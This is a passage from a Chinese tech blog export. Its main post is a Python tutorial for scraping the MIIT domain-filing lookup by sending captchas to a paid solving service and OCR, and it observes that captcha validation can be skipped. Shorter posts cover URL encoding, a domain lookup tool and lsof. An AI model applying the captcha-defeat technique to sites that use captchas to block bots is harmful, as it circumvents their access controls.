结构），这个还能忍，最不能忍的是他那个验证码，我十次输入只有一次对的。 它的验证码长这样的，6位数英文+数字随机组合 而工作中又需要经常去查询客户域名是否备案与否，一些第三方网站查询有可能不准确，比如读取的是缓存数据。所以最准确的还是去工信部查询。那么只好自己写个爬虫去爬下数据咯。 验证码明明是对的，他却说错了，验证的时候都校验通过，提交的时候却提示错误，屎一样的网站。","text":"大家好，我是阿文，今天给大家讲解一下如何使用 python 来查询工信部域名备案信息，那么先讲下为什么不直接查询而是要用这种手段爬呢？ 首先，工信部这个网站也不知道是不是找外包做的，里面各种嵌套表格（现在网站基本都是 div+css 结构），这个还能忍，最不能忍的是他那个验证码，我十次输入只有一次对的。 它的验证码长这样的，6位数英文+数字随机组合 而工作中又需要经常去查询客户域名是否备案与否，一些第三方网站查询有可能不准确，比如读取的是缓存数据。所以最准确的还是去工信部查询。那么只好自己写个爬虫去爬下数据咯。 验证码明明是对的，他却说错了，验证的时候都校验通过，提交的时候却提示错误，屎一样的网站。 所需要的环境和库python 版本 我这里是用的 python3.7（只要是 python3 应该都问题不大） 库 import requests import fateadm_api from bs4 import BeautifulSoup 辅助工具 postman （主要是用来模拟请求的） 最终结果先看一眼最终结果 ➜ get_domain_info git:(master) ✗ python3 get_beian.py AFOV58 {&apos;name&apos;: &apos;杭州网易质云科技有限公司&apos;, &apos;nature&apos;: &apos;企业&apos;, &apos;icp_number&apos;: &apos;浙ICP备17006647号-2&apos;, &apos;web_name&apos;: &apos;网易云&apos;, &apos;domain&apos;: &apos;www.163yun.com&apos;, &apos;check_data&apos;: &apos;2018-07-17&apos;} ➜ get_domain_info git:(master) ✗ python3 get_beian.py {&apos;name&apos;: &apos;方文俊&apos;, &apos;nature&apos;: &apos;个人&apos;, &apos;icp_number&apos;: &apos;浙ICP备15018780号-3&apos;, &apos;web_name&apos;: &apos;阿文codeing&apos;, &apos;domain&apos;: &apos;www.awen.me&apos;, &apos;check_data&apos;: &apos;2016-12-14&apos;} ➜ get_domain_info git:(master) ✗ 如图所示 里面包含了名称、属性、备案号、域名、审核时间等信息，一般你买的接口也就返回这些数据。那些封装好的接口其实也是去爬工信部的网站来获取数据，其实，这个里面最难的是验证码识别，我试了 python 的 PIL 库调用tesserocr 去处理验证码效果不是很好，参考文章python 识别验证码于是调用第三方接口，这些第三方接口基本都是基于 TensorFlow 来通过机器学习模拟训练的，识别率特别高，几乎每一张验证码都能正确识别。 不得不佩服，工信部这样的网站得配合机器学习来食用，门槛着实是高。就像 12306 一样，设计那么复杂的验证码其实就是为了防止被爬虫爬。然而现在有了机器学习之后，通过让机器不断的训练自我学习，这些复杂的玩意已经很轻松的就被破解了。 话不多说，我们继续。。 分析请求步骤第一步，首先我们打开工信部的查询备案网站 http://www.miitbeian.gov.cn/publish/query/indexFirst.action ，然后用 chrome 打开开发者菜单，切换到 network，然后点击获取验证码，可以看到有一个请求 我们仔细看下这个请求的请求信息，包括请求 url、请求头和请求参数 Request URL: http://www.miitbeian.gov.cn/getVerifyCode?40 Accept: image/webp,image/apng,image/*,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cache-Control: no-cache Connection: keep-alive Cookie: __jsluid=eb9d0c3a04daf97b1958257fef1a5126; JSESSIONID=Tx2EwxeRj_u-RKvL0HSzpFdoxfEBE3y1pRvoePlozRoVYAPr7uE2!1649116120 DNT: 1 Host: www.miitbeian.gov.cn Pragma: no-cache Referer: http://www.miitbeian.gov.cn/icp/publish/query/icpMemoInfo_showPage.action User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36多次刷新验证码，发现后面都是两位数的值，其实我发现就算这个40不变也没关系，照样能生成一个新的验证码。这个应该是防止有缓存。 第二步，好，现在试试输入验证码，观察下请求，发现有个验证验证码的请求，这里注意了，即使你验证码输入的是小写，他也会在请求时转成大写。 此外，你还需要记录下请求 URL、请求头和查询参数（Form Data） 里面的值，也就是大写的验证码。 第三步，我们输入域名，工信部查询的方式有很多种，这里只讲通过域名去查，其他的你把参数换了传给服务器也一样的，我们输入验证码后查询请求里面有一个 请求如下： Request URL: http://www.miitbeian.gov.cn/icp/publish/query/icpMemoInfo_searchExecute.action Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cache-Control: no-cache Connection: keep-alive Content-Length: 144 Content-Type: application/x-www-form-urlencoded Cookie: __jsluid=eb9d0c3a04daf97b1958257fef1a5126; JSESSIONID=k36E8uIkINZgWY2svrcyVR5TceIIiEclzOOeOJ7jzaVzXoILuPyo!1298008624 DNT: 1 Host: www.miitbeian.gov.cn Origin: http://www.miitbeian.gov.cn Pragma: no-cache Referer: http://www.miitbeian.gov.cn/icp/publish/query/icpMemoInfo_searchExecute.action Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36其 Form Data 里面的值如下： siteName: condition: 1 siteDomain: awen.me siteUrl: mainLicense: siteIp: unitName: mainUnitNature: -1 certType: -1 mainUnitCertNo: verifyCode: NNCX6O重点关注 siteDomain 和 verifyCode 这两个值一个是域名一个是验证码，提交请求后，我们看到页面显示 包括序号、主办单位名称、单位性质、备案号、网站名称等等。我们看下对应请求的 response 信息，可以看到，他其实是将上述信息保存在一张 table 的 td 标签里面，这个 td 标签class 属性叫 bxy。也就是说我们最后只要把这个标签里面的值拿到就可以了。如果返回没有这个标签那就说明这个网站没有备案了。 好了，到这里，基本上整个查询过程就完成了。接下来我们开始写代码 代码1.首先，我们导入几个库 import requests import fateadm_api from bs4 import BeautifulSoup import random其中 fateadm_api 是一个第三方打码平台的库，我之前自己实现过识别验证码 ，准确率不高。这个你也可以去换成其他的。BeautifulSoup 是用来解析 html 标签获取到最终的值。 然后，我们要创建一个 session ，因为请求过程中会带上session 。 requests_session = requests.session()第一步，获取验证码，我们实现个方法，这个验证码干的事情就是去获取验证码并保存到本地，然后调用打码接口识别验证码。最后返回验证码信息 # 获取验证码进行解析，这里调用 http://www.fateadm.com/price.html 打码平台的接口获取验证码 def get_verify_code(): url = &quot;http://www.miitbeian.gov.cn/getVerifyCode?&quot;+str(random.randint(1,100)) headers = { &apos;Accept&apos;: &quot;image/webp,image/apng,image/*,*/*;q=0.8&quot;, &apos;Accept-Encoding&apos;: &quot;gzip, deflate&quot;, &apos;Accept-Language&apos;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &apos;Cache-Control&apos;: &quot;no-cache&quot;, &apos;Connection&apos;: &quot;keep-alive&quot;, &apos;DNT&apos;: &quot;1&quot;, &apos;Host&apos;: &quot;www.miitbeian.gov.cn&quot;, &apos;Pragma&apos;: &quot;no-cache&quot;, &apos;Referer&apos;: &quot;http://www.miitbeian.gov.cn/icp/publish/query/icpMemoInfo_showPage.action&quot;, &apos;User-Agent&apos;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&quot;, } response = requests_session.get(url, headers=headers) if response.status_code == 200: with open(&apos;code.jpg&apos;, &apos;wb&apos;) as file: file.write(response.content) # 识别验证码 verifyCode = fateadm_api.TestFunc(&apos;code.jpg&apos;) return verifyCode 注意所有请求头里面的 cookie 字段都去掉，因为 requests_session = requests.session() 会带 cookie 去请求，requests 库这个方法直接给我们维护了 session ，我们不需要去关心 cookie。你可以直接 print(response.headers) 打印响应头查看 set-cookie 信息。 第二步，校验验证码，这一步是模拟输入验证码后判断验证码是否输入正确，如正确会返回 True # 模拟输入验证码后判断验证码是否输入正确 def check_verify_code(validateValue): url = &quot;http://www.miitbeian.gov.cn/common/validate/validCode.action&quot; payload = {&quot;validateValue&quot;: validateValue} headers = { &apos;content-type&apos;: &quot;multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW&quot;, &apos;Accept&apos;: &quot;application/json, text/javascript, */*&quot;, &apos;Accept-Encoding&apos;: &quot;gzip, deflate&quot;, &apos;Accept-Language&apos;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &apos;Cache-Control&apos;: &quot;no-cache&quot;, &apos;Connection&apos;: &quot;keep-alive&quot;, &apos;Content-Length&apos;: &quot;20&quot;, &apos;Content-Type&apos;: &quot;application/x-www-form-urlencoded&quot;, &apos;DNT&apos;: &quot;1&quot;, &apos;Host&apos;: &quot;www.miitbeian.gov.cn&quot;, &apos;Origin&apos;: &quot;http://www.miitbeian.gov.cn&quot;, &apos;Pragma&apos;: &quot;no-cache&quot;, &apos;Referer&apos;: &quot;http://www.miitbeian.gov.cn/icp/publish/query/icpMemoInfo_showPage.action&quot;, &apos;User-Agent&apos;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&quot;, &apos;X-Requested-With&apos;: &quot;XMLHttpRequest&quot;, } response = requests_session.post(url, data=payload, headers=headers) if response.status_code != 200: return resp_json = response.json() return resp_json[&apos;result&apos;]第三步，查询，我们需要把服务器响应的 body 内的内容拿到并且进行解析 html 从中提取对于我们有价值的信息放入字典中。 # 模拟查询并反馈备案信息 # 例如：{&apos;name&apos;: &apos;杭州网易质云科技有限公司&apos;, &apos;nature&apos;: &apos;企业&apos;, &apos;icp_number&apos;: &apos;浙ICP备17006647号-2&apos;, &apos;web_name&apos;: &apos;网易云&apos;, &apos;domain&apos;: &apos;www.163yun.com&apos;, &apos;check_data&apos;: &apos;2018-07-17&apos;} def do_request_beian(domain, verifyCode): url = &quot;http://www.miitbeian.gov.cn/icp/publish/query/icpMemoInfo_searchExecute.action&quot; payload = &quot;siteName=&amp;condition=1&amp;siteDomain=&quot; + domain + &quot;&amp;siteUrl=&amp;mainLicense=&amp;siteIp=&amp;unitName=&amp;mainUnitNature=-1&amp;certType=-1&amp;mainUnitCertNo=&amp;verifyCode=&quot; + verifyCode headers = { &apos;content-type&apos;: &quot;multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW&quot;, &apos;Accept&apos;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;, &apos;Accept-Encoding&apos;: &quot;gzip, deflate&quot;, &apos;Accept-Language&apos;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &apos;Cache-Control&apos;: &quot;no-cache&quot;, &apos;Connection&apos;: &quot;keep-alive&quot;, &apos;Content-Length&apos;: &quot;144&quot;, &apos;Content-Type&apos;: &quot;application/x-www-form-urlencoded&quot;, &apos;DNT&apos;: &quot;1&quot;, &apos;Host&apos;: &quot;www.miitbeian.gov.cn&quot;, &apos;Origin&apos;: &quot;http://www.miitbeian.gov.cn&quot;, &apos;Pragma&apos;: &quot;no-cache&quot;, &apos;Referer&apos;: &quot;http://www.miitbeian.gov.cn/icp/publish/query/icpMemoInfo_showPage.action&quot;, &apos;Upgrade-Insecure-Requests&apos;: &quot;1&quot;, &apos;User-Agent&apos;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&quot;, } response = requests_session.post(url, data=payload, headers=headers) if response.status_code != 200: return html_context = response.text # 解析 html，获取对应的值存入 dict 中 soup = BeautifulSoup(html_context, &quot;html.parser&quot;) soup_msg = soup.find_all(name=&apos;td&apos;, attrs={&apos;class&apos;: &quot;bxy&quot;}) soup.prettify() icp_list = [] for content in soup_msg: content = content.get_text() content_out = &quot;&quot;.join(content.split()) icp_list.append(content_out) icp_info = {&quot;name&quot;: icp_list[0], &quot;nature&quot;: icp_list[1], &quot;icp_number&quot;: icp_list[2], &quot;web_name&quot;: icp_list[3], &quot;domain&quot;: icp_list[4], &quot;check_data&quot;: icp_list[-2]} return icp_info我们重点说下怎么解析，看下面这段代码: # 解析 html，获取对应的值存入 dict 中 soup = BeautifulSoup(html_context, &quot;html.parser&quot;) soup_msg = soup.find_all(name=&apos;td&apos;, attrs={&apos;class&apos;: &quot;bxy&quot;}) soup.prettify() icp_list = [] for content in soup_msg: content = content.get_text() content_out = &quot;&quot;.join(content.split()) icp_list.append(content_out)我们获取到响应的 html 内容后要把他传入到BeautifulSoup中，然后通过 find_all 查找到 class 属性为 bxy 的 所有 td 标签。因为我们需要的信息就在这个 td 标签里面。拿到信息之后我们循环获取 td 标签中的值并对值进行处理，里面包含了&amp;nbsp;这种空格信息不是我们想要的，需要处理掉。最后存入我们定义的 icp_list 中。 考虑到如果 soup_msg 为空的情况，我们捕获下异常，如果报异常了那就是没有未备案 try: soup_msg = soup.find_all(name=&apos;td&apos;, attrs={&apos;class&apos;: &quot;bxy&quot;}) icp_list = [] for content in soup_msg: content = content.get_text() content_out = &quot;&quot;.join(content.split()) icp_list.append(content_out) icp_info = {&quot;name&quot;: icp_list[0], &quot;nature&quot;: icp_list[1], &quot;icp_number&quot;: icp_list[2], &quot;web_name&quot;: icp_list[3], &quot;domain&quot;: icp_list[4], &quot;check_data&quot;: icp_list[-2]} return icp_info except IndexError: return &apos;未备案&apos;或者如果list 为空就打印未备案 if len(soup_msg): icp_list = [] for content in soup_msg: content = content.get_text() content_out = &quot;&quot;.join(content.split()) icp_list.append(content_out) icp_info = {&quot;name&quot;: icp_list[0], &quot;nature&quot;: icp_list[1], &quot;icp_number&quot;: icp_list[2], &quot;web_name&quot;: icp_list[3], &quot;domain&quot;: icp_list[4], &quot;check_data&quot;: icp_list[-2]} return icp_info print(&quot;未备案&quot;)最后我们在 main 方法里面调用者三个方法，并将验证码转为大写传入进行验证，如果值为 True 则执行查询。 if __name__ == &apos;__main__&apos;: verify_code = str(get_verify_code()).upper() if check_verify_code(verify_code) is True: print(do_request_beian(&quot;awen.me&quot;, verify_code))另外，我发现即使不判断验证码是否为 True 也可以查询 verify_code = str(get_verify_code()).upper() # if check_verify_code(verify_code) is True: print(do_request_beian(&quot;qingchan.me&quot;, verify_code))大概就是这样样子。其实这个主要是学习和巩固了下 HTTP 的request 库的使用以及BeautifulSoup库的使用。老实讲，我还是比较喜欢那种返回的数据是 json 的网站，直接 json 解析就 ok，美滋滋。 github地址：https://github.com/monkey-wenjun/get_icp_info/tree/master","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python3 处理 url 编码","slug":"python3-处理-url-编码","date":"2018-08-28T06:26:29.000Z","updated":"2021-02-26T06:05:29.287Z","comments":true,"path":"posts/65460.html","link":"","permalink":"https://awen.me/posts/65460.html","excerpt":"","text":"python3 中处理 urlencode 需要这样操作 from urllib import parse str = &apos;/a/b/c/ 放大点.jpg&apos; str1 = parse.quote(str) # 不处理斜杠 print(str1) # 结果 /a/b/c/%20%E6%94%BE%E5%A4%A7%E7%82%B9.jpg str2 = parse.quote_plus(str) # 对斜杠进行编码 print(str2) # 结果 %2Fa%2Fb%2Fc%2F+%E6%94%BE%E5%A4%A7%E7%82%B9.jpg","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python 循环int 类型 list","slug":"python-循环int-类型-list","date":"2018-08-28T03:29:13.000Z","updated":"2021-02-26T06:05:29.284Z","comments":true,"path":"posts/13449.html","link":"","permalink":"https://awen.me/posts/13449.html","excerpt":"python 循环读取一个 list 列表，里面的值都是 int 型。但是报错，之前一直没报错 TypeError: &apos;int&apos; object is not iterable","text":"python 循环读取一个 list 列表，里面的值都是 int 型。但是报错，之前一直没报错 TypeError: &apos;int&apos; object is not iterable 解决方法 1234organization_id = [5555,33322,112223]for i in range(len(organization_id)): print(organization_id[i])","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python 识别验证码","slug":"python-识别验证码","date":"2018-08-27T07:22:50.000Z","updated":"2021-02-26T06:05:29.286Z","comments":true,"path":"posts/9831.html","link":"","permalink":"https://awen.me/posts/9831.html","excerpt":"想调用工信部的备案接口去批量判断下域名是否备案，发现有验证码，而工信部的验证码是特别恶心的，正确的输入都有可能错。于是想着可以调用接口获取验证码去查询。","text":"想调用工信部的备案接口去批量判断下域名是否备案，发现有验证码，而工信部的验证码是特别恶心的，正确的输入都有可能错。于是想着可以调用接口获取验证码去查询。 我这里使用了 request、pytesseract然后还有tesseract brew install tesseract代码123456789101112131415161718192021222324252627282930313233343536import requestsimport pytesseractfrom PIL import Imageimport jsonrequests_session = requests.session()def get_verify_code(): url = \"http://www.miitbeian.gov.cn/getVerifyCode?50\" headers = &#123; 'Accept': \"image/webp,image/apng,image/*,*/*;q=0.8\", 'Accept-Encoding': \"gzip, deflate\", 'Accept-Language': \"zh-CN,zh;q=0.9,en;q=0.8\", 'Cache-Control': \"no-cache\", 'Connection': \"keep-alive\", 'DNT': \"1\", 'Host': \"www.miitbeian.gov.cn\", 'Pragma': \"no-cache\", 'Referer': \"http://www.miitbeian.gov.cn/icp/publish/query/icpMemoInfo_showPage.action\", 'User-Agent': \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36\", &#125; response = requests_session.get(url, headers=headers) if response.status_code == 200: with open('code.jpg', 'wb') as file: file.write(response.content) img = Image.open('/Users/wenjun/PycharmProjects/get_domain_info/code.jpg') return_code = pytesseract.image_to_string(img) print(return_code)if __name__ == '__main__': get_verify_code() 结果，默认识别率并不高，没一次是准的 于是换了网站—知网 import requests import tesserocr from PIL import Image import time import json requests_session = requests.session() def get_verify_code(): import requests url = &quot;http://my.cnki.net/elibregister/CheckCode.aspx&quot; querystring = {&quot;id&quot;:(int(time.time())*1000)} headers = { &apos;Accept&apos;: &quot;image/webp,image/apng,image/*,*/*;q=0.8&quot;, &apos;Accept-Encoding&apos;: &quot;gzip, deflate&quot;, &apos;Accept-Language&apos;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &apos;Cache-Control&apos;: &quot;no-cache&quot;, &apos;Connection&apos;: &quot;keep-alive&quot;, &apos;Cookie&apos;: &quot;Ecp_ClientId=8180828132605418310; Ecp_IpLoginFail=18082859.111.198.102; ASP.NET_SessionId=lmkarndj230wvzo2n5ntzge0; SID=020102; ImageV=2QPV&quot;, &apos;DNT&apos;: &quot;1&quot;, &apos;Host&apos;: &quot;my.cnki.net&quot;, &apos;Pragma&apos;: &quot;no-cache&quot;, &apos;Referer&apos;: &quot;http://my.cnki.net/elibregister/commonRegister.aspx&quot;, &apos;User-Agent&apos;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&quot;, &apos;Postman-Token&apos;: &quot;7e66b937-40bd-4de8-a221-f8a2ef8db407&quot; } response = requests.request(&quot;GET&quot;, url, headers=headers, params=json.dumps(querystring) ) response = requests_session.get(url, headers=headers) if response.status_code == 200: with open(&apos;code.jpg&apos;, &apos;wb&apos;) as file: file.write(response.content) image = Image.open(&apos;/Users/wenjun/PycharmProjects/get_domain_info/code.jpg&apos;) time.sleep(5) image = image.convert(&apos;L&apos;) threshold = 127 table = [] for i in range(256): if i &lt; threshold: table.append(0) else: table.append(1) image = image.point(table, &apos;1&apos;) image.show() result = tesserocr.image_to_text(image) print(result) # return_code = pytesseract.image_to_string(img) # print(return_code) if __name__ == &apos;__main__&apos;: get_verify_code()这个准确率还有点高，如图所示","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"批量查询域名是否备案域名以及域名解析","slug":"批量查询域名是否备案域名以及域名解析","date":"2018-08-26T05:42:17.000Z","updated":"2021-02-26T06:05:29.339Z","comments":true,"path":"posts/37042.html","link":"","permalink":"https://awen.me/posts/37042.html","excerpt":"因为工作需要，需要查询域名备案，有时候需要查询一个或多个域名，有时候是需要给一整个文件内的域名进行判断是否备案与否，此外还需批量查询域名是否解析到我们的域名，但是 dig nslookup 这种域名只能查询单个域名，我总不能一个一个去 dig 看吧，这样太麻烦了。于是，写了个工具批量查询域名备案和域名解析的脚本。","text":"因为工作需要，需要查询域名备案，有时候需要查询一个或多个域名，有时候是需要给一整个文件内的域名进行判断是否备案与否，此外还需批量查询域名是否解析到我们的域名，但是 dig nslookup 这种域名只能查询单个域名，我总不能一个一个去 dig 看吧，这样太麻烦了。于是，写了个工具批量查询域名备案和域名解析的脚本。 github 仓库地址： https://github.com/monkey-wenjun/get_domain_info 实现思路域名备案从命令行获取仓库进行查询，可以是一个或多个，也可以从文件读取进行查询。 域名解析从 命令行读取参数进行解析查询，或从文件读取列表去查询 A 记录、CNAME 记录和 NS 记录，并对结果进行去重。 脚本使用说明 源码开源但是备案查询接口调用的是 NowAPI 的，需要把get_single_filing_info 方法中的 appkey 或 sign 替换成你自己的。。或者使用其他接口。 环境 python 3 第三方模块安装 1pip3 install -r requirements.txt requirements.txt 内容如下: 1234dnspython3argparserequeststldextract 查看帮助 1234567891011121314151617181920212223242526 #./get_domain_info.py This is Get domain info Toolsusage: get_domain_info.py [-h] [-dl DOMAIN_LIST [DOMAIN_LIST ...]] [-df DOMAIN_FILE] [-rl RECORD_LIST [RECORD_LIST ...]] [-rf RECORD_FILE] [-ip IP [IP ...]] [-a] [-u] [-v]optional arguments: -h, --help show this help message and exit -dl DOMAIN_LIST [DOMAIN_LIST ...], --domain_list DOMAIN_LIST [DOMAIN_LIST ...] Query single or multiple domain name filing information. -df DOMAIN_FILE, --domain_file DOMAIN_FILE Query multiple domain name filing information as files. -rl RECORD_LIST [RECORD_LIST ...], --record_list RECORD_LIST [RECORD_LIST ...] Query single or multiple domain name resolution. -rf RECORD_FILE, --record_file RECORD_FILE Query multiple domain name resolutions as files. -ip IP [IP ...], --ip IP [IP ...] Query IP attribution. -a, --auth Show Auth Info. -u, --update Update Tools. -v, --version Show Version. 使用说明不管是备案还是 DNS 查询，如果域名包含完整 URL 的，会自动过滤提取裸域后进行查询，例如查询备案： 12➜ get_domain_info git:(master) ✗ .&#x2F;get_domain_info.py -dl https:&#x2F;&#x2F;awen.me&#x2F;post&#x2F;18464.htmlawen.me ALREADY_BEIAN 或是查询 DNS 123.&#x2F;get_domain_info.py -rl https:&#x2F;&#x2F;awen.me&#x2F;post&#x2F;18464.htmlDomain CNAME NS Aawen.me adrian.ns.cloudflare.com. 183.131.200.74,183.131.200.69,183.131.200.61,183.131.200.72,183.131.200.68 1.批量查询域名解析1.获取单个或多个 域名的解析 1./get_domain_info.py -rl 163yun.com www.163yun.com 从文件读取域名列表进行域名解析查询 1.&#x2F;get_domain_info.py -rf ~&#x2F;Downloads&#x2F;domain.txt 从文件读取域名查询的，结果中会进行去重，有重复 IP 的只提取一个 2.查询备案1.获取单个或多个域名备案（多个域名用空格分隔） 1.&#x2F;get_domain_info.py -dl baidu.com awen.me 2.从文件读取域名列表进行备案查询 1.&#x2F;get_domain_info.py -df ~&#x2F;Downloads&#x2F;domain.txt","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"Linux lsof 命令","slug":"Linux-lsof-命令","date":"2018-08-21T14:21:04.000Z","updated":"2021-02-26T06:05:29.253Z","comments":true,"path":"posts/18464.html","link":"","permalink":"https://awen.me/posts/18464.html","excerpt":"lsof（list open files）是一个查看当前系统文件的工具。在linux环境下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。如传输控制协议 (TCP) 和用户数据报协议 (UDP) 套接字等，系统在后台都为该应用程序分配了一个文件描述符，该文件描述符提供了大量关于这个应用程序本身的信息。","text":"lsof（list open files）是一个查看当前系统文件的工具。在linux环境下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。如传输控制协议 (TCP) 和用户数据报协议 (UDP) 套接字等，系统在后台都为该应用程序分配了一个文件描述符，该文件描述符提供了大量关于这个应用程序本身的信息。 lsof打开的文件可以是： 普通文件 目录 网络文件系统的文件 字符或设备文件 (函数)共享库 管道，命名管道 符号链接 网络文件（例如：NFS file、网络socket，unix域名socket） 还有其它类型的文件，等等 命令参数-a 列出打开文件存在的进程-c&lt;进程名&gt; 列出指定进程所打开的文件-g 列出GID号进程详情-d&lt;文件号&gt; 列出占用该文件号的进程+d&lt;目录&gt; 列出目录下被打开的文件+D&lt;目录&gt; 递归列出目录下被打开的文件-n&lt;目录&gt; 列出使用NFS的文件-i&lt;条件&gt; 列出符合条件的进程。（4、6、协议、:端口、 @ip ）-p&lt;进程号&gt; 列出指定进程号所打开的文件-u 列出UID号进程详情-h 显示帮助信息-v 显示版本信息 说明： 1.查看某个目录的进程打开 [root@y-3c-a018 fwj]# lsof +D /opt/kf5/ COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME superviso 7867 root 15w REG 8,3 98336 2675942 /opt/kf5/log/robot_offline_info.log superviso 7867 root 18w REG 8,3 4464 2681975 /opt/kf5/log/robot_new_info.log superviso 7867 root 21w REG 8,3 24828 947215 /opt/kf5/log/im.log superviso 7867 root 24w REG 8,3 293 2675940 /opt/kf5/log/robot_pending_info.log superviso 7867 root 27w REG 8,3 294 2675938 /opt/kf5/log/robot_open_info.log python3 7869 root 3w REG 8,3 671328 2675937 /opt/kf5/log/kf5.log python3 7870 root 3w REG 8,3 671328 2675937 /opt/kf5/log/kf5.log python3 7873 root 3w REG 8,3 671328 2675937 /opt/kf5/log/kf5.log python3 7875 root 3w REG 8,3 671328 2675937 /opt/kf5/log/kf5.log python3 7876 root 3w REG 8,3 671328 2675937 /opt/kf5/log/kf5.log python3 7877 root 3w REG 8,3 671328 2675937 /opt/kf5/log/kf5.log python3 7878 root 3w REG 8,3 671328 2675937 /opt/kf5/log/kf5.loglsof输出各列信息的意义如下： COMMAND：进程的名称 PID：进程标识符 PPID：父进程标识符（需要指定-R参数） USER：进程所有者 PGID：进程所属组 FD：文件描述符，应用程序通过文件描述符识别该文件。如cwd、txt等: （1）cwd：表示current work dirctory，即：应用程序的当前工作目录，这是该应用程序启动的目录，除非它本身对这个目录进行更改（2）txt ：该类型的文件是程序代码，如应用程序二进制文件本身或共享库，如上列表中显示的 /sbin/init 程序（3）lnn：library references (AIX);（4）er：FD information error (see NAME column);（5）jld：jail directory (FreeBSD);（6）ltx：shared library text (code and data);（7）mxx ：hex memory-mapped type number xx.（8）m86：DOS Merge mapped file;（9）mem：memory-mapped file;（10）mmap：memory-mapped device;（11）pd：parent directory;（12）rtd：root directory;（13）tr：kernel trace file (OpenBSD);（14）v86 VP/ix mapped file;（15）0：表示标准输入（16）1：表示标准输出（17）2：表示标准错误一般在标准输出、标准错误、标准输入后还跟着文件状态模式：r、w、u等（1）u：表示该文件被打开并处于读取/写入模式（2）r：表示该文件被打开并处于只读模式（3）w：表示该文件被打开并处于（4）空格：表示该文件的状态模式为unknow，且没有锁定（5）-：表示该文件的状态模式为unknow，且被锁定同时在文件状态模式后面，还跟着相关的锁（1）N：for a Solaris NFS lock of unknown type;（2）r：for read lock on part of the file;（3）R：for a read lock on the entire file;（4）w：for a write lock on part of the file;（文件的部分写锁）（5）W：for a write lock on the entire file;（整个文件的写锁）（6）u：for a read and write lock of any length;（7）U：for a lock of unknown type;（8）x：for an SCO OpenServer Xenix lock on part of the file;（9）X：for an SCO OpenServer Xenix lock on the entire file;（10）space：if there is no lock. TYPE列有以下常见取值: REG:一般文件DIR:目录CHR:字符设备BLK:块设备FIFO:命名管道PIPE:管道IPV4:ipv4套接字unix:unix域套接字 使用1.列出所有打开的文件: lsof 备注: 如果不加任何参数，就会打开所有被打开的文件，建议加上一下参数来具体定位 2.查看谁正在使用某个文件 lsof /filepath/file3.递归查看某个目录的文件信息 lsof +D /filepath/filepath2/ 备注: 使用了+D，对应目录下的所有子目录和文件都会被列出 4.比使用+D选项，遍历查看某个目录的所有文件信息 的方法 lsof | grep ‘/filepath/filepath2/’5.列出某个用户打开的文件信息 lsof -u username 备注: -u 选项，u其实是user的缩写 6.列出某个程序所打开的文件信息 lsof -c mysql 备注: -c 选项将会列出所有以mysql开头的程序的文件，其实你也可以写成 lsof | grep mysql, 但是第一种方法明显比第二种方法要少打几个字符了 7.列出多个程序多打开的文件信息 lsof -c mysql -c apache8.列出某个用户以及某个程序所打开的文件信息 lsof -u test -c mysql9.列出除了某个用户外的被打开的文件信息 lsof -u ^root 备注：^这个符号在用户名之前，将会把是root用户打开的进程不让显示 10.通过某个进程号显示该进行打开的文件 lsof -p 111.列出多个进程号对应的文件信息 lsof -p 123,456,78912.列出除了某个进程号，其他进程号所打开的文件信息 lsof -p ^113 .列出所有的网络连接 lsof -i14.列出所有tcp 网络连接信息 lsof -i tcp15.列出所有udp网络连接信息 lsof -i udp16.列出谁在使用某个端口 lsof -i :330617.列出谁在使用某个特定的udp端口 lsof -i udp:55特定的tcp端口 lsof -i tcp:8018.列出某个用户的所有活跃的网络端口 lsof -a -u test -i19.列出所有网络文件系统 lsof -N20.域名socket文件 lsof -u21.某个用户组所打开的文件信息 lsof -g 555522.根据文件描述列出对应的文件信息 lsof -d description(like 2)23.根据文件描述范围列出文件信息 lsof -d 2-3几个疑问1.FD 那一栏15w 是什么意思？ 如图所示 15 代表该进程当前的文件描述符，可以通过 cat /proc/7867/fd/15去查看当前进程调用的 FD 信息，通常 Linux 的文件描述符从3开始 0、1、2 代表输入 输出还有错误输出。 2.DEVICE 这一栏，8,3 是什么意思 我还不清楚，不过 man 看了下 lsof 